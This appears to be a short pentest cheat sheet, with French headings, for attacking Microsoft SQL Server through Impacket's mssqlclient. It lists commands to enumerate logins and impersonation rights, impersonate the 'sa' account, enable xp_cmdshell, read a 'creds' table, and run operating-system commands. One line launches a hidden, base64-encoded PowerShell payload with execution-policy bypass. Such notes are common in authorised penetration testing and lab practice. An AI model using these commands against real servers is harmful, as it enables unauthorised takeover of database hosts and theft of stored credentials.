## Installation

```bash
pipx install impacket
mssqlclient.py user:pass@$target -windows-auth
mssqlclient.py 'user'@127.0.0.1 -windows-auth
```
## Enumération
```sql
help
enum_*
enum_logins
enum_impersonate

exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami

SELECT @@version;
SELECT name, type_desc FROM sys.server_principals;
```
## Navigation
```sql
SELECT name FROM sys.databases;
USE <database>;
SELECT * FROM creds;

SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = '<table>';
SELECT TOP 10 * FROM <table>;
```
## xp_cmdshell
```sql
-- Activer
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Utiliser
EXEC xp_cmdshell 'whoami';

-- Impacket
enable_xp_cmdshell
xp_cmdshell powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
```
